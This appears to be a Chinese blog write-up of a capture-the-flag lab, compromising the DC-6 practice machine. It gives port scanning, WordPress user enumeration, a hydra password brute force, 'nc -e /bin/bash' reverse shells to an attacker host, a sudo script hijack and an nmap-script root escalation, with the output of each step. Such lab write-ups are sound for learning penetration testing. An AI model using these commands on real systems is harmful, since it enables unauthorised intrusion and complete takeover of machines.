---
 title: DC-6靶机渗透实战
 date: 2020-02-06 20:14:46
 tags: 靶机渗透
 categories: 靶机渗透
---

### 靶机介绍

这次的靶机渗透实战是一个找寻靶机中的flag的过程，并以获得最终的flag为目标。
靶机下载地址:http://www.five86.com/dc-6.html

### 信息搜集
直接上nmap进行扫描
> nmap -sV -A -p- 172.16.0.18
```
Nmap scan report for localhost (172.16.0.18)
Host is up (0.00019s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)
|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)
|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to http://wordy/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:0C:29:9C:80:16 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
**可知开放22、80端口，linux主机，同样要设置hosts,发现是wordpress**
发现开了80端口却无法访问，是重定向到wordy域名，可改hosts文件访问，添加ip对应域名

win10路径： C:\Windows\System32\drivers\etc\hosts

linux路径： etc/hosts

* 根据靶机官网提示
> cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt That should save you a few years. ;-)
**猜测爆破进入后台**

<!--more-->

### 渗透实战
1. wpscan扫描用户,获取到5个用户
> wpscan --url wordy -e u
```
[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] graham
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] mark
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] sarah
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] jens
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```
2. 尝试爆破ssh和web后台
- 爆破后台
> hydra -L users.txt -P jimpass.txt -f wordy http-post-form "wp-login.php:text=^USER^&pwd=^PASS^:S=logout"
* 获取到密码
> mark helpdesk01
- 进入后台发现有个active管理插件命令执行漏洞
![2020-2-6-21-21-21](https://raw.githubusercontent.com/bbkali/picbad/master/2020-2-6-21-21-21)
- 直接抓包使用nc反弹shell
> nc 172.16.0.10 2222 -e /bin/bash
![2020-2-6-21-22-34](https://raw.githubusercontent.com/bbkali/picbad/master/2020-2-6-21-22-34)
- 获取交互shell
> python -c "import pty;pty.spawn('/bin/bash')"
```
root@bbkali:/tmp/dc6# nc -lvp 2222
listening on [any] 2222 ...
connect to [172.16.0.10] from wordy [172.16.0.18] 36108
python -c "import pty;pty.spawn('/bin/bash')"
```
- 常规翻看目录，发现有价值提示to-do-sometings.txt
```

www-data@dc-6:/home$ ls -R

.:
graham  jens  mark  sarah

./graham:

./jens:
backups.sh

./mark:
stuff

./mark/stuff:
things-to-do.txt

./sarah:

www-data@dc-6:/home/mark/stuff$ cat things-to-do.txt 

Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement
```
* 发现graham密码
3. 提权
- ssh登录graham发现backups.txt可利用提权
```
graham@dc-6:/home$ sudo -l
Matching Defaults entries for graham on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
graham@dc-6:/home$ cat /home/jens/backups.sh
#!/bin/bash
tar -czf backups.tar.gz /var/www/html
```
- 直接将nc命令加入backups.sh
```
graham@dc-6:/home/jens$ cat backups.sh 
nc 172.16.0.10 2223 -e /bin/bash
graham@dc-6:/home/jens$ sudo -u jens ./backups.sh
```
- 获取到jens权限,发现能以root用户免密码执行nmap
```
pwd
/home
whoami
jens
sudo -l
Matching Defaults entries for jens on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap
```
- 写个nmap脚本
> echo 'os.execute("/bin/sh")' > root.nse
- 运行该脚本获取root权限并拿到flag
> sudo nmap --script=/home/jens/root.nse
```
jens@dc-6:~$ sudo nmap --script=/home/jens/root.nsesudo nmap --script=/home/jens/root.nse


Starting Nmap 7.40 ( https://nmap.org ) at 2020-02-07 00:06 AEST
# pwd
/home/jens
# whoami
root
# cd /root
# s^H
/bin/sh: 4: : not found
# ls
theflag.txt
# cat theflag.txt


Yb        dP 888888 88     88         8888b.   dP"Yb  88b 88 888888 d8b 
 Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
  YbdPYbdP   88""   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   `"' 
   YP  YP    888888 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 (8) 


Congratulations!!!

Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
```